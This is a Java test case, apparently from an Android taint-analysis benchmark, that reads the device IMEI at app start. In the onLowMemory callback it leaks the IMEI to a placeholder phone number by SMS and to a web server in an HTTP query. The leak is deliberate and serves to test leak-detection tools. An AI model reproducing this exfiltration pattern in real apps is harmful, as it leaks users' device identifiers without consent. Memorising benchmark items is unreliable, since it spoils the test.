package de.ecspride;

import android.app.Application;
import android.content.Context;
import android.os.StrictMode;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * @testcase_name ApplicationLifecycle2
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description A secret value is obtained on application start and leaked in the low memory
 * 	callback.
 * @dataflow source -> onCreate() -> imei -> onLowMemory() -> sink
 * @number_of_leaks 1
 * @challenges Correct handling of callbacks in the Application object
 */
public class ApplicationLifecyle2 extends Application {

	private String imei;
	
	@Override
	public void onCreate() {
		super.onCreate();
		if (android.os.Build.VERSION.SDK_INT > 9) {
			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
			StrictMode.setThreadPolicy(policy);
		}

		TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		imei = tm.getDeviceId();
	}

	@Override
	public void onLowMemory() {
		super.onLowMemory();
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, imei, null, null); //sink, leak

		try {
			connect(imei);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void connect(String data) throws IOException {
		String URL = "http://www.google.de/search?q=";
		URL = URL.concat(data);
		java.net.URL url = new URL(URL);
		HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
		conn.setRequestMethod("GET");
		conn.setDoInput(true);
		// Starts the query
		conn.connect();
		Log.d(getClass().getSimpleName(), URL);

		InputStream is = conn.getInputStream();
		if (is == null)
			return;
		StringBuilder sb = new StringBuilder();
		BufferedReader br = new BufferedReader(new InputStreamReader(is));
		String line = null;
		try {
			while ((line = br.readLine()) != null)
				sb.append(line);
		} finally {
			br.close();
			is.close();
		}
		Log.d(getClass().getSimpleName(), sb.toString());
	}

}
